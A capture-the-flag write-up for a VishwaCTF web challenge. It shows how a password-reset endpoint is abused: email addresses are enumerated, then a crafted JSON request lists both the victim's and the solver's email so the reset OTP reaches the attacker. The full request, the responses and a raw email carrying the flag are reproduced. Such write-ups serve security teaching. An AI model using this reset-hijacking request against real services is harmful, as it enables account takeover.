# Challenge description

ark.dev forgot his HackerOne username and password, help him!!

Author: Samarth @ark.dev

# Soluce

When we explore the website, we see that there is a login form and a "forgot password" link. When we click on the link, we see that it asks for the email.

In the description we have seen that the author forgot his HackerOne username and password. So we can try to find the email with his username and the HackerOne domain:

```
Username: ark.dev
Email: ark.dev@hackerone.dev
```

When we enter a wrong email, it said that the email is not registered. So we can know if the email is registered or not.

So we can try to reset the password with the email and it sends that:

```json
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.10.16
Date: Wed, 05 Mar 2025 12:22:38 GMT
Content-Type: application/json
Content-Length: 54
Connection: close

{
  "success": "Password reset email has been sent"
}
```

But we don't have any access to the email so we can't see the email. So we will modify the original request to send the email into our mail address:

```http
POST /reset-password HTTP/1.1
Host: web.eng.run:8951
Content-Length: 75
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://web.eng.run:8951
Referer: http://web.eng.run:8951/reset
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"user":{"email":["ark.dev@hackerone.com", "virgile@gmail.com"]}}
```

And we received an email with an OTP code. We try to put it, but the server said:

```json
HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/3.1.3 Python/3.10.16
Date: Wed, 05 Mar 2025 12:30:09 GMT
Content-Type: application/json
Content-Length: 64
Connection: close

{
  "message": "Invalid OTP, maybe you are missing something"
}
```

So we go back on the email and download it. We see that the email is:

```eml
Delivered-To: virgile@gmail.com
Received: by 2002:a05:7300:6d83:b0:15f:8ee3:9ecb with SMTP id t3csp806509dyo;
        Wed, 5 Mar 2025 04:03:41 -0800 (PST)
X-Received: by 2002:a05:6a21:6d9e:b0:1ee:eeaa:919c with SMTP id adf61e73a8af0-1f34944efddmr5141126637.8.1741176221409;
        Wed, 05 Mar 2025 04:03:41 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1741176221; cv=none;
        d=google.com; s=arc-20240605;
        b=ZUOmlDZ5spHXjTmgvyAXBY49syPVL+fcmOzRBteGpMpkCqc0ug48lYvxootEpRlu5s
         Bdo0fBp37q5LUWi52YTgEoAiNMPjVs/GMEAZ4TVJIa7OiVyAaDnpn81Pksa+2rFb0WX5
         Qi6pHeQ66K5Ex4BhnCJS/rU0TOqfw/ebZXylO7UumugIiLhr02GockckozWDJU0eWSmH
         K4Jqi3KQKCeYL6pnx2UBTh7AEl8PuAij0CvCDwZ9xLe4h63AOaJvjqwJkhtqSamRrQnr
         D8CmLCh08eewDxs/Hxl+NVhDb1GD71i0g7fTJw5yROVbxE1F1hRVB4+I7IY3Yq5bak2s
         8LtA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=subject:to:from:mime-version:date:message-id:dkim-signature;
        bh=/rjtDecmDzXgAburwF0FXFfv52+S1k/s2Y957aOYxj4=;
        fh=c6VGErTTrlIRoGC8OK+VuylE3W+ysGohWKK+3nKDKoU=;
        b=NZJBO0yFESyyhQNIZYZk0Uan7z2GP8ERblBaEwV8jHsT6nX8dz8mV3Qobw1r5yO8AU
         roctLPZNvDIlVpz1jm9UvcrTGjX4iJd1bK8G4ZBBGCGwMeryQPnGYxo6GNB9N8QHUxrc
         mSXbqtAZcd9hsTCpxtBMJN96ggitk5q+TeGY48isFNHAOfpYKLRpFIXdwfUSFhAoAowG
         a9Z9Cnfk/oqTfpnlLS9yzhZ/gCoanS+Fx/wdB/2MqGhwazW2B7dhyIv4ZhVq/+iIhKNu
         AtuCYAq+iSe8xULuCTw52zeYtFrN1MiQS0P0sC9RZlYDFwcVa0Hel48HDkrpAGtjFtTl
         fpvQ==;
        dara=google.com
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@viit-ac-in.20230601.gappssmtp.com header.s=20230601 header.b=W3X4rpoz;
       spf=none (google.com: cybercell@viit.ac.in does not designate permitted sender hosts) smtp.mailfrom=cybercell@viit.ac.in;
       dara=pass header.i=@gmail.com
Return-Path: <cybercell@viit.ac.in>
Received: from mail-sor-f41.google.com (mail-sor-f41.google.com. [209.85.220.41])
        by mx.google.com with SMTPS id d2e1a72fcca58-734a001e5b5sor9275250b3a.5.2025.03.05.04.03.41
        for <virgile@gmail.com>
        (Google Transport Security);
        Wed, 05 Mar 2025 04:03:41 -0800 (PST)
Received-SPF: none (google.com: cybercell@viit.ac.in does not designate permitted sender hosts) client-ip=209.85.220.41;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@viit-ac-in.20230601.gappssmtp.com header.s=20230601 header.b=W3X4rpoz;
       spf=none (google.com: cybercell@viit.ac.in does not designate permitted sender hosts) smtp.mailfrom=cybercell@viit.ac.in;
       dara=pass header.i=@gmail.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=viit-ac-in.20230601.gappssmtp.com; s=20230601; t=1741176220; x=1741781020; dara=google.com;
        h=subject:to:from:mime-version:date:message-id:from:to:cc:subject
         :date:message-id:reply-to;
        bh=/rjtDecmDzXgAburwF0FXFfv52+S1k/s2Y957aOYxj4=;
        b=W3X4rpozUm9vZKGwm+iLwkr7U8bDBLgw0PHD4W9ZMws3Cu+QRgwk2xMIQhJ3F+XmHO
         nRY460SWIntmG/C9TVIR78PlfSf/hNocfEGGTf+X237+FHiTiFmTP6bh/5oRr1mo/PfT
         iO6dZx+oES8fjDpo03vF5P79RyJtZhldSXAQKT92cs1wyuCZ132UClSsMGv3Jw/YjL7v
         zMxwbOP33c/zXdn/yumQP7CBlg9klHcHUaCav/miwaXTTADlT+D49ytoj0TnDLdtKmXl
         lZ0QnL4Aa2mqLf8FBejJZxR1GceVFv5lac+ifxfEcSWZmKXDpUuhr+bS4AnPVscbbhvr
         8qzg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1741176220; x=1741781020;
        h=subject:to:from:mime-version:date:message-id:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=/rjtDecmDzXgAburwF0FXFfv52+S1k/s2Y957aOYxj4=;
        b=ABuDlaehyZ5qGxuDMstxdggPw4/JSdv1SYXVxLSJhDz0abZ+mj0BGG4SbEA3+5c7WN
         hog4S6njr1J8uG05LSsJT68omHEuQHjyhqxtmgQIc2Fh4GEqkgDULfsUVSRKxlQvo0Py
         D6w3ZZNyQN54y3jbFH6P42roDkCtzHXVOhz17fYBE6MJhRxRY+HWR0XcnFbEugdO4DCh
         xU7t5dGYKmg0fP+5YsfBtW6bHgw5bmNirEtA2U31shjv9Y1dzNT3oN3fctttnCEHp8l/
         MGuQU3on6OpdsUnLtYYUN8yObZyiRhtkUfaUetCYum3QpaEGhDqF13SRNAJhtNH7mH5u
         g7Cg==
X-Gm-Message-State: AOJu0YzDruMU6LFHEYXCr+qA0+7PT6iZySD7YSaG6WttMb0pXGhxfufz
	z8HXOkXhmXrgOjFD1G7loLgfzItnUhF+STQQg9ULvSVXoDF+Ma9aoRRjlS90/Ulygv7NBLEWT5M
	J6IM=
X-Gm-Gg: ASbGncsAM0tKGzs+0xgxB9yH1b6jmLIPo8pXqqKT+p2sKeOoJtCnTw7PM71W6Q6fqBG
	Zyd7R1ZB5XdBW6/6IE2dTMO4WVTEHBQvJj6k+1mZNOV1jBZgr9FXHON+wPwGrrUAF3qzgsA9IGm
	rPd6f8+czxOFEIYlmBiTx/KeJH1U3yskAO3+kkMEfwzAdhg8UekNJ4i9yoL6vzEbEC5VRHhFj18
	uBGlTOJL0Hku7esCBiJdTUk3j+baflYcqH+Tj4QGlg8WCfmn3MA29wpIcztIYGiG6u4DlRi+9N/
	UUecH9rjyTb3ATLJHaeLQDlagk2lt6RPo/kicYwpc9YrQRHQxFwOurzwEo3W/GD5pZheBWy9Bf/
	d0NClfYPKmUQR0hP6M/u9V8LK
X-Google-Smtp-Source: AGHT+IFHS/YgJ5vlv+C+LNRRRnH+Uu2CXeYHD6SaALonOJZr6Klju93GDPg9DL/pyhJo+nrEnnZmZA==
X-Received: by 2002:a05:6a00:1397:b0:736:54c9:df2c with SMTP id d2e1a72fcca58-73682c8c0abmr3617250b3a.15.1741176220527;
        Wed, 05 Mar 2025 04:03:40 -0800 (PST)
Return-Path: <cybercell@viit.ac.in>
Received: from [172.17.0.26] (ec2-13-126-47-8.ap-south-1.compute.amazonaws.com. [13.126.47.8])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-734a003dd31sm12725478b3a.152.2025.03.05.04.03.39
        for <virgile@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 05 Mar 2025 04:03:40 -0800 (PST)
Message-ID: <67c83d9c.050a0220.3347ce.ac62@mx.google.com>
Date: Wed, 05 Mar 2025 04:03:40 -0800 (PST)
Content-Type: multipart/mixed; boundary="===============8100061172653354408=="
MIME-Version: 1.0
From: cybercell@viit.ac.in
To: virgile@gmail.com
Subject: =?utf-8?q?=F0=9F=94=90_HackerOne_=7C_Password_Reset_Request?=
X-CTF-SECRETS: VishwaCTF{y0u_4r3_7h3_h4ck3r_numb3r_0n3_2688658}

--===============8100061172653354408==
Content-Type: text/html; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: base64

CiAgICAgICAgICAgICAgICA8aHRtbD4KICAgICAgICAgICAgICAgIDxoZWFkPgogICAgICAgICAg
ICAgICAgICAgIDxzdHlsZT4KICAgICAgICAgICAgICAgICAgICAgICAgYm9keSB7CiAgICAgICAg
ICAgICAgICAgICAgICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjRmNGY0OwogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgcGFkZGluZzogMjBweDsKICAgICAgICAgICAgICAgICAgICAg
ICAgfQogICAgICAgICAgICAgICAgICAgICAgICAuY29udGFpbmVyIHsKICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIGJhY2tncm91bmQ6IHdoaXRlOwogICAgICAgICAgICAgICAgICAgICAgICAg
ICAgcGFkZGluZzogMjBweDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJvcmRlci1yYWRp
dXM6IDhweDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJveC1zaGFkb3c6IDBweCA0cHgg
MTBweCByZ2JhKDAsIDAsIDAsIDAuMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXgt
d2lkdGg6IDUwMHB4OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFyZ2luOiBhdXRvOwog
ICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGgyIHsKICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIGNvbG9yOiAjMzMzOwogICAgICAgICAgICAgICAgICAg
ICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIC5vdHAtYm94IHsKICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIGZvbnQtc2l6ZTogMjRweDsKICAgICAgICAgICAgICAgICAgICAgICAgICAg
IGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sb3I6ICNm
ZmY7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMDA3YmZmOwogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgICAgICAgICAgICAgICAg
IGJvcmRlci1yYWRpdXM6IDVweDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldHRlci1z
cGFjaW5nOiAzcHg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXJnaW46IDEwcHggMDsK
ICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAuZm9vdGVy
IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIGNvbG9yOiAjNzc3OwogICAgICAgICAgICAgICAgICAgICAgICAg
ICAgbWFyZ2luLXRvcDogMTBweDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAg
ICAgICAgICAgIDwvc3R5bGU+CiAgICAgICAgICAgICAgICA8L2hlYWQ+CiAgICAgICAgICAgICAg
ICA8Ym9keT4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAg
ICAgICAgICAgICAgICAgICAgICA8aDI+8J+UkSBIYWNrZXJPbmUgfCBQYXNzd29yZCBSZXNldCBS
ZXF1ZXN0PC9oMj4KICAgICAgICAgICAgICAgICAgICAgICAgPHA+SGVsbG8sPC9wPgogICAgICAg
ICAgICAgICAgICAgICAgICA8cD5Zb3UgcmVjZW50bHkgcmVxdWVzdGVkIGEgcGFzc3dvcmQgcmVz
ZXQuIFVzZSB0aGUgT1RQIGJlbG93IHRvIHByb2NlZWQ6PC9wPgogICAgICAgICAgICAgICAgICAg
ICAgICA8ZGl2IGNsYXNzPSJvdHAtYm94Ij5TUUhHUzdZVTwvZGl2PgogICAgICAgICAgICAgICAg
ICAgICAgICA8cD5JZiB5b3UgZGlkbuKAmXQgcmVxdWVzdCB0aGlzLCB5b3UgY2FuIHNhZmVseSBp
Z25vcmUgdGhpcyBlbWFpbC48L3A+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPkJlc3QgcmVn
YXJkcyw8YnI+U2FtYXJ0aEdoYW50ZSBASGFja2VyT25lLVRlYW08L3A+CiAgICAgICAgICAgICAg
ICAgICAgICAgIDxwIGNsYXNzPSJmb290ZXIiPlRoaXMgaXMgYW4gYXV0b21hdGVkIG1lc3NhZ2Uu
IFBsZWFzZSBkbyBub3QgcmVwbHkuIChPciBTaG91bGQgWW91PykgPC9wPgogICAgICAgICAgICAg
ICAgICAgICAgICA8cCBjbGFzcz0iZm9vdGVyIj5JRDogMUFNeFh2Z09EcUhyTGtDcVZON04wQVBW
RWZYY2pzSHpDIDwvcD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAg
IDwvYm9keT4KICAgICAgICAgICAgICAgIDwvaHRtbD4KICAgICAgICAgICAgICAgIA==

--===============8100061172653354408==--
```

So the flag is `VishwaCTF{y0u_4r3_7h3_h4ck3r_numb3r_0n3_2688658}`.
